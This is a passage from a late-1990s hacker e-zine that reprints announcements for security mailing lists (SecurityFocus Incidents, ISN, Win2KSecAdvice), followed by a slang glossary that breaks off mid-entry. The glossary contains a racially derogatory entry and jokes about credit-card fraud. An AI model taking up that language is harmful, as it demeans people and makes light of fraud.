      On the community creating front you will find a set of forums
      and mailing lists we hope you will find useful. A number of them
      are not scheduled to start for several weeks but starting today
      the following list is available:
      
      
      * Incidents' Mailing List. BUGTRAQ has always been about the
         discussion of new vulnerabilities. As such I normally don't approve
         messages about break-ins, trojans, viruses, etc with the exception
         of wide spread cases (Melissa, ADM worm, etc). The other choice
         people are usually left with is email CERT but this fails to
         communicate this important information to other that may be
         potentially affected.
      
      
         The Incidents mailing list is a lightly moderated mailing list to
         facilitate the quick exchange of security incident information.
         Topical items include such things as information about rootkits
         new trojan horses and viruses, source of attacks and tell-tale
         signs of intrusions.
      
      
         To subscribe email LISTSERV@SECURITYFOCUS.COM with a message body
         of:
      
      
                   SUBS INCIDENTS FirstName, LastName
      
      
      Shortly we'll also be introducing an Information Warfare forum along
      with ten other forums over the next two months. These forums will be
      built and moderated by people in the community as well as vendors who
      are willing to take part in the community building process.
      *Note to the vendors here* We have several security vendors who have
      agreed to run forums where they can participate in the online communities.
      If you would like to take part as well, mail Alfred Huger,
      ahuger@securityfocus.com.
      
      
      On the information resource front you find a large database of
      the following:
      
      
      * Vulnerabilities. We are making accessible a free vulnerability
         database. You can search it by vendor, product and keyword. You
         will find detailed information on the vulnerability and how to fix it,
         as well are links to reference information such as email messages,
         advisories and web pages. You can search by vendor, product and
         keywords. The database itself is the result of culling through 5
         years of BUGTRAQ plus countless other lists and news groups. It's
         a shining example of how thorough full disclosure has made a significant
         impact on the industry over the last half decade.
      
      
      * Products. An incredible number of categorized security products
         from over two hundred different vendors.
      
      
      * Services. A large and focused directory of security services offered by
         vendors.
      
      
      * Books, Papers and Articles. A vast number of categorized security
         related books, papers and articles. Available to download directly
         for our servers when possible.
      
      
      * Tools. A large array of free security tools. Categorized and
         available for download.
      
      
      * News: A vast number of security news articles going all the way
         back to 1995.
      
      
      * Security Resources: A directory to other security resources on
         the net.
      
      
      As well as many other things such as an event calendar.
      
      
      For your convenience the home-page can be personalized to display
      only information you may be interested in. You can filter by
      categories, keywords and operating systems, as well as configure
      how much data to display.
      
      
      I'd like to thank the fine folks at NETSPACE for hosting the
      site for as long as they have. Their services have been invaluable.
      
      
      I hope you find these changes for the best and the new services
      useful. I invite you to visit http://www.securityfocus.com/ and
      check it out for yourself. If you have any comments or suggestions
      please feel free to contact me at this address or at

      --[ New ISN announcement (New!!)
      
      
      Sender:       ISN Mailing List <ISN@SECURITYFOCUS.COM>
      From:         mea culpa <jericho@DIMENSIONAL.COM>
      Subject:      Where has ISN been?
      Comments: To: InfoSec News <isn@securityfocus.com>
      To:           ISN@SECURITYFOCUS.COM
      
      
      It all starts long ago, on a network far away..
      
      
      Not really. Several months ago the system that hosted the ISN mail list
      was taken offline. Before that occured, I was not able to retrieve the
      subscriber list. Because of that, the list has been down for a while. I
      opted to wait to get the list back rather than attempt to make everyone
      resubscribe.
      
      
      As you can see from the headers, ISN is now generously being hosted by
      Security Focus [www.securityfocus.com]. THey are providing the bandwidth,
      machine, and listserv that runs the list now.
      
      
      Hopefully, this message will find all ISN subscribers, help us weed out
      dead addresses, and assure you the list is still here. If you have found
      the list to be valuable in the past, please tell friends and associates
      about the list. To subscribe, mail listserv@securityfocus.com with
      "subscribe isn firstname lastname". To unsubscribe, "unsubscribe isn".
      
      
      As usual, comments and suggestions are welcome. I apologize for the down
      time of the list. Hopefully it won't happen again. ;)

      InfoSec News is a privately run, medium traffic list that caters 
      to distribution of information security news articles. These 
      articles will come from newspapers, magazines, online resources, 
      and more.
      
      
      The subject line will always contain the title of the article, so that
      you may quickly and effeciently filter past the articles of no interest.
      
      
      This list will contain:
      
      
      o       Articles catering to security, hacking, firewalls, new security
              encryption, products, public hacks, hoaxes, legislation affecting
              these topics and more.
      
      
      o       Information on where to obtain articles in current magazines.
      
      
      o       Security Book reviews and information.
      
      
      o       Security conference/seminar information.
      
      
      o       New security product information.
      
      
      o       And anything else that comes to mind..
      
      
      Feedback is encouraged. The list maintainers would like to hear what
      you think of the list, what could use improving, and which parts
      are "right on". Subscribers are also encouraged to submit articles
      or URLs. If you submit an article, please send either the URL or
      the article in ASCII text. Further, subscribers are encouraged to give
      feedback on articles or stories, which may be posted to the list.
      
      
      Please do NOT:
      
      
              * subscribe vanity mail forwards to this list
      
      
              * subscribe from 'free' mail addresses (ie: juno, hotmail)
      
      
              * enable vacation messages while subscribed to mail lists
      
      
              * subscribe from any account with a small quota
      
      
      All of these generate messages to the list owner and make tracking
      down dead accounts very difficult. I am currently receiving as many 
      as fifty returned mails a day. Any of the above are grounds for
      being unsubscribed. You are welcome to resubscribe when you address
      the issue(s).

      Welcome to Win2K Security Advice! Thank you for subscribing. If you have any
      questions or comments about the list please feel free to contact the list
      moderator, Steve Manzuik, at steve@win2ksecadvice.net.
      
      To see what you've missed recently on the list, or to research an item
      of interest, be sure to visit the Web-based archives located at:
      http://www.ntsecurity.net/scripts/page_listserv.asp?s=win2ksec
      
      ==============
      NTSecurity.net brings the security community a brand new (Oct 99) and
      much-requested Windows security mailing list. This new moderated mailing list,
      Win2KSecAdvice (formerly NTSecAdvice,) is geared towards promoting the open
      discussion of Windows-related security issues.
      
      With a firm and unwavering commitment towards timely full disclosure, this
      new resource promises to become a great forum for open discussion
      regarding security-related bugs, vulnerabilities, potential exploits, virus,
      worms, Trojans, and more. Win2KSecAdvice promotes a strong sense of community
      and we openly invite all security minded individuals, be they white hat,
      gray hat, or black hat, to join the new mailing list.
      
      While Win2KSecAdvice was named in the spirit of Microsoft's impending product
      line name change, and meant to reflect the list's security focus both now and
      in the long run, it is by no means limited to security topics centered around
      Windows 2000. Any security issues that pertain to Windows-based networking are
      relevant for discussion, including all Windows operating systems, MS Office,
      MS BackOffice, and all related third party applications and hardware.
      
      The scope of Win2KSecAdvice can be summarized very simply: if it's relevant to
      a security risk, it's relevant to the list.
      
      The list archives are available on the Web at http://www.ntsecurity.net,
      which include a List Charter and FAQ, as well as Web-based searchable list
      archives for your research endeavors.
      
      SAVE THIS INFO FOR YOUR REFERENCE:

A.9  Whats in a name? why HWA.hax0r.news??
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                             
      
      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour <sic> also wigger

            HNN affiliates ;)

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
            some coffee?' or can you hax0r some bread on the way to the table please?'

            2 - A tool for cutting sheet metal.

    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper
